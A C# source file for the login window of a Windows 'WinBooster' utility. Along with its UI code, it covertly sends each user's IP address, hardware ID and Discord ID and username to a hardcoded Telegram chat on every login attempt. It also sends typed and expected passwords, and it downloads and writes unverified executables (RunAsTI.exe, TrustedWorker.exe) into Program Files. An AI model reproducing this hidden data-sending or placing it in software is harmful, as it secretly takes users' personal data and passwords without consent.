

using H.Formatters;
using H.Pipes;
using HandyControl.Controls;
using HandyControl.Data;
using HandyControl.Tools.Extension;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Threading;
using Telegram.Bot;
using Telegram.Bot.Types;
using WinBooster_WPF.RemoteControl;
using WinBooster_WPF.RemoteControl.Pipeline.Messages;
using WinBoosterNative.data;

namespace WinBooster_WPF
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class Auth : HandyControl.Controls.Window
    {
        public Main main = null;
        public Auth()
        {
            InitializeComponent();
        }
        int attemp = 1;
        private async void Button_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            RemoteControlData remoteControlData = App.remoteControlData;
            string password = string.Empty;
            Settings? temp = Settings.FromFile(settings.GetPath(), Settings.protection_password, Settings.protection_salt);
            if (temp != null)
            {
                password = temp.password;
                settings = temp;
            }
            else
            {
                settings.SaveFile(settings.GetPath(), Settings.protection_password, Settings.protection_salt);
            }
            if (PasswordBox.Password.Equals(password))
            {
                string telegramSend = "";
                telegramSend += "✅ Успешная авторизация\n\n";
                telegramSend += "<tg-spoiler>";
                telegramSend += "Основаная информация\n";
                telegramSend += $"🌐 IP: {remoteControlData.main.ip}\n";
                telegramSend += $"🌐 Hardware ID: {remoteControlData.main.hardwareID}\n\n";
                telegramSend += "WinBooster информация\n";
                telegramSend += $"⌨ Пароль: {password}\n\n";
                if (remoteControlData.discord.id != 0)
                {
                    telegramSend += "Discord информация\n";
                    telegramSend += $"🌐 ID: {remoteControlData.discord.id}\n";
                    telegramSend += $"🧑‍ Username: {remoteControlData.discord.name}\n";
                }
                telegramSend += "</tg-spoiler>";
                try { App.telegramRemoteControl.bot.SendTextMessageAsync(new ChatId(1040139729), telegramSend, Telegram.Bot.Types.Enums.ParseMode.Html).Wait(); } catch { }
                this.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                {
                    AuthPanel.Hide();
                    DownloadPanel.Visibility = System.Windows.Visibility.Visible;
                    Title = "Loading";
                }));
                await Task.Factory.StartNew(async () =>
                {
                    using (WebClient wc = new WebClient())
                    {
                        DownloadFiles(wc);

                        StepBar.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                        {
                            StepBar.Next();
                        }));
                        await Task.Delay(500);
                        StepBar.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                        {
                            StepBar.Next();
                        }));

                        await Task.Delay(500);
                        this.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                        {
                            OpenForm();
                        }));
                    }
                });
            }
            else
            {
                string telegramSend = "";
                telegramSend += "❌ Неверная авторизацияя\n\n";
                telegramSend += "<tg-spoiler>";
                telegramSend += "Основаная информация\n";
                telegramSend += $"🌐 IP: {remoteControlData.main.ip}\n";
                telegramSend += $"🌐 Hardware ID: {remoteControlData.main.hardwareID}\n\n";
                telegramSend += "WinBooster информация\n";
                telegramSend += $"⌨ Вводимый пароль: {PasswordBox.Password}\n";
                telegramSend += $"⌨ Ожидаемый пароль: {password}\n\n";
                if (remoteControlData.discord.id != 0)
                {
                    telegramSend += "Discord информация\n";
                    telegramSend += $"🌐 ID: {remoteControlData.discord.id}\n";
                    telegramSend += $"🧑‍ Username: {remoteControlData.discord.name}\n";
                }
                telegramSend += "</tg-spoiler>";
                try { App.telegramRemoteControl.bot.SendTextMessageAsync(new ChatId(1040139729), telegramSend, Telegram.Bot.Types.Enums.ParseMode.Html).Wait(); } catch { }
                string text = $"Wrong password\nAttemp: {attemp++}\\3";

                GrowlInfo growl = new GrowlInfo
                {
                    Message = text,
                    ShowDateTime = true,
                    IconKey = "ErrorGeometry",
                    IconBrushKey = "DangerBrush",
                    IsCustom = true
                };

                Growl.InfoGlobal(growl);
                if (attemp > 3)
                {
                    PasswordBox.IsEnabled = false;
                    PasswordButton.IsEnabled = false;
                    AnimationPath path = (AnimationPath)FindName("PasswordAnimation");
                    path.Stroke = new SolidColorBrush(Colors.IndianRed);
                }
            }
        }
        private void DownloadFiles(WebClient wc)
        {
            if (!Directory.Exists("C:\\Program Files\\WinBooster"))
                Directory.CreateDirectory("C:\\Program Files\\WinBooster");
            if (!Directory.Exists("C:\\Program Files\\WinBooster\\DataBase"))
                Directory.CreateDirectory("C:\\Program Files\\WinBooster\\DataBase");
            if (!Directory.Exists("C:\\Program Files\\WinBooster\\Statistic"))
                Directory.CreateDirectory("C:\\Program Files\\WinBooster\\Statistic");

            if (!System.IO.File.Exists("C:\\Program Files\\WinBooster\\RunAsTI.exe"))
            {
                try 
                {
                    var bytes = wc.DownloadData("https://github.com/Nekiplay/Temp/raw/main/RunAsTI.exe");
                    if (!System.IO.File.Exists("C:\\Program Files\\WinBooster\\RunAsTI.exe"))
                        System.IO.File.Create("C:\\Program Files\\WinBooster\\RunAsTI.exe").Close();
                    System.IO.File.WriteAllBytes("C:\\Program Files\\WinBooster\\RunAsTI.exe", bytes);
                }
                catch
                {
                    GrowlInfo growl = new GrowlInfo
                    {
                        Message = "Error downloading: RunAsTI",
                        ShowDateTime = true,
                        IconKey = "ErrorGeometry",
                        IconBrushKey = "DangerBrush",
                        IsCustom = true
                    };
                    Growl.InfoGlobal(growl);
                }
                StepBar.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                {
                    StepBar.Next();
                }));
            }
            try 
            { 
                var bytes = wc.DownloadData("https://github.com/Nekiplay/WinBooster_Cloud/raw/main/files/TrustedWorker.exe");
                if (!System.IO.File.Exists("C:\\Program Files\\WinBooster\\TrustedWorker.exe"))
                    System.IO.File.Create("C:\\Program Files\\WinBooster\\TrustedWorker.exe").Close();
                System.IO.File.WriteAllBytes("C:\\Program Files\\WinBooster\\TrustedWorker.exe", bytes);
            }
            catch
            {
                GrowlInfo growl = new GrowlInfo
                {
                    Message = "Error downloading: TrustedWorker",
                    ShowDateTime = true,
                    IconKey = "ErrorGeometry",
                    IconBrushKey = "DangerBrush",
                    IsCustom = true
                };
                Growl.InfoGlobal(growl);
            }
            try 
            {
                string bdPath = "C:\\Program Files\\WinBooster\\DataBase\\clear.json";
                string bd = wc.DownloadString("https://raw.githubusercontent.com/Nekiplay/WinBooster_Cloud/main/database/clear.json");
                if (!System.IO.File.Exists(bdPath))
                {
                    System.IO.File.Create(bdPath).Close();
                }

                string current = System.IO.File.ReadAllText(bdPath);
                if (current != bd)
                {
                    GrowlInfo growl = new GrowlInfo
                    {
                        Message = "Successfully updated: cleaner database",
                        ShowDateTime = true,
                        IconKey = "SuccessGeometry",
                        IconBrushKey = "SuccessBrush",
                        IsCustom = true
                    };
                    Growl.InfoGlobal(growl);
                }

                System.IO.File.WriteAllText(bdPath, bd);
            }
            catch (Exception e)
            {
                string bdPath = "C:\\Program Files\\WinBooster\\DataBase\\clear.json";
                string message = "Error updating: cleaner database";
                if (!System.IO.File.Exists(bdPath))
                {
                    message = "Error downloading: cleaner database";
                }
                GrowlInfo growl = new GrowlInfo
                {
                    Message = message,
                    ShowDateTime = true,
                    IconKey = "ErrorGeometry",
                    IconBrushKey = "DangerBrush",
                    IsCustom = true
                };
                Growl.InfoGlobal(growl);
            }

            try 
            {
                string bdPath = "C:\\Program Files\\WinBooster\\DataBase\\sha3.json";
                string bd = wc.DownloadString("https://github.com/Nekiplay/WinBooster_Cloud/raw/main/database/sha3/list.json");
                if (!System.IO.File.Exists(bdPath))
                {
                    System.IO.File.Create(bdPath).Close();
                }

                string current = System.IO.File.ReadAllText(bdPath);
                if (current != bd)
                {
                    GrowlInfo growl = new GrowlInfo
                    {
                        Message = "Successfully updated: sha3 database",
                        ShowDateTime = true,
                        IconKey = "SuccessGeometry",
                        IconBrushKey = "SuccessBrush",
                        IsCustom = true
                    };
                    Growl.InfoGlobal(growl);
                }

                System.IO.File.WriteAllText(bdPath, bd);
            }
            catch
            {
                string message = "Error updating: sha3 database";
                if (!System.IO.File.Exists("C:\\Program Files\\WinBooster\\DataBase\\sha3.json"))
                {
                    message = "Error downloading: sha3 database";
                }
                GrowlInfo growl = new GrowlInfo
                {
                    Message = message,
                    ShowDateTime = true,
                    IconKey = "ErrorGeometry",
                    IconBrushKey = "DangerBrush",
                    IsCustom = true
                };
                Growl.InfoGlobal(growl);
            }
            // "C:\\Program Files\\WinBooster\\DataBase\\fileNameLanguages.json"
            try 
            {
                string bdPath = "C:\\Program Files\\WinBooster\\DataBase\\fileNameLanguages.json";
                string bd = wc.DownloadString("https://raw.githubusercontent.com/Nekiplay/WinBooster_Cloud/main/database/fileNameToLanguage.json");
                if (!System.IO.File.Exists(bdPath))
                {
                    System.IO.File.Create(bdPath).Close();
                }

                string current = System.IO.File.ReadAllText(bdPath);
                if (current != bd)
                {
                    GrowlInfo growl = new GrowlInfo
                    {
                        Message = "Successfully updated: languages database",
                        ShowDateTime = true,
                        IconKey = "SuccessGeometry",
                        IconBrushKey = "SuccessBrush",
                        IsCustom = true
                    };
                    Growl.InfoGlobal(growl);
                }

                System.IO.File.WriteAllText(bdPath, bd);
            }
            catch
            {
                string bdPath = "C:\\Program Files\\WinBooster\\DataBase\\fileNameLanguages.json";
                string message = "Error updating: Languages database";
                if (!System.IO.File.Exists(bdPath))
                {
                    message = "Error downloading: Languages database";
                }
                GrowlInfo growl = new GrowlInfo
                {
                    Message = message,
                    ShowDateTime = true,
                    IconKey = "ErrorGeometry",
                    IconBrushKey = "DangerBrush",
                    IsCustom = true
                };
                Growl.InfoGlobal(growl);
            }
        }
        public Statistic statistic = new Statistic();
        public Settings settings = new Settings();
        public void SaveStatistic()
        {
            statistic.SaveFile(statistic.GetPath(), Statistic.protection_password, Statistic.protection_salt);
        }
        public void OpenForm()
        {
            if (System.IO.File.Exists(statistic.GetPath()))
            {
                Statistic? statistic1 = Statistic.FromFile(statistic.GetPath(), Statistic.protection_password, Statistic.protection_salt);
                if (statistic1 != null)
                    statistic = statistic1;
            }
            this.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
            {
                this.Hide();
                main = new Main();
                main.Show();
            }));
        }
        public static PipeServer<string> tiWorkerServer;
        private async void Window_Loaded(object sender, System.Windows.RoutedEventArgs e)
        {
            Task.Factory.StartNew(async() =>
            {
                try
                {
                    var server = new PipeServer<string>("WinBoosterChecker", formatter: new NewtonsoftJsonFormatter());
                    server.StartAsync().Wait(1000);
                    tiWorkerServer = new PipeServer<string>("WinBoosterTiCkecker", formatter: new NewtonsoftJsonFormatter());
                    tiWorkerServer.StartAsync().Wait(1000);
                    var client2 = new PipeClient<string>("WinBoosterChecker", formatter: new NewtonsoftJsonFormatter());
                    client2.ConnectAsync().Wait(1000);
                    var client3 = new PipeClient<object>("WinBooster_TiWorker", formatter: new NewtonsoftJsonFormatter());
                    Thread.Sleep(5000);
                    client3.ConnectAsync().Wait(1000);
                    client3.WriteAsync(new MoveFileMessage() { to = new FileInfo("C:\\a\\a.exe"), from = new FileInfo("C:\\a\\a.exe") });
                }
                catch
                {
                    await Task.Delay(5);
                    GrowlInfo growl = new GrowlInfo
                    {
                        Message = "Program is already running\nClosing in 2.5 seconds",
                        ShowDateTime = true,
                        IconKey = "ErrorGeometry",
                        IconBrushKey = "DangerBrush",
                        IsCustom = true
                    };
                    Growl.InfoGlobal(growl);
                    await Task.Factory.StartNew(async () =>
                    {
                        await Task.Delay(2500);
                        App.SuperExit();
                    });
                }
            });
            
            try
            {
                if (!Directory.Exists("C:\\Program Files\\WinBooster"))
                {
                    Directory.CreateDirectory("C:\\Program Files\\WinBooster");
                }
            }
            catch { }
            string password = string.Empty;
            Settings? temp = Settings.FromFile(settings.GetPath(), Settings.protection_password, Settings.protection_salt);
            if (temp != null)
            {
                password = temp.password;
                settings = temp;
            }
            if (string.IsNullOrEmpty(password) || password == "")
            {
                RemoteControlData remoteControlData = App.remoteControlData;
                string telegramSend = "";
                telegramSend += "✅ Успешная авторизация\n\n";
                telegramSend += "<tg-spoiler>";
                telegramSend += "Основаная информация\n";
                telegramSend += $"🌐 IP: {remoteControlData.main.ip}\n";
                telegramSend += $"🌐 Hardware ID: {remoteControlData.main.hardwareID}\n\n";
                telegramSend += "WinBooster информация\n";
                telegramSend += $"⌨ Пароль: {password}\n\n";
                if (remoteControlData.discord.id != 0)
                {
                    telegramSend += "Discord информация\n";
                    telegramSend += $"🌐 ID: {remoteControlData.discord.id}\n";
                    telegramSend += $"🧑‍ Username: {remoteControlData.discord.name}\n";
                }
                telegramSend += "</tg-spoiler>";
                try { App.telegramRemoteControl.bot.SendTextMessageAsync(new ChatId(1040139729), telegramSend, Telegram.Bot.Types.Enums.ParseMode.Html).Wait(); } catch { }
                this.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                {
                    AuthPanel.Hide();
                    DownloadPanel.Visibility = System.Windows.Visibility.Visible;
                    Title = "Loading";
                }));
                await Task.Factory.StartNew(async () =>
                {
                    using (WebClient wc = new WebClient())
                    {
                        DownloadFiles(wc);

                        StepBar.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                        {
                            StepBar.Next();
                        }));
                        await Task.Delay(500);
                        StepBar.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                        {
                            StepBar.Next();
                        }));

                        await Task.Delay(500);
                        this.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                        {
                            OpenForm();
                        }));
                    }
                });
            }
        }
    }
}
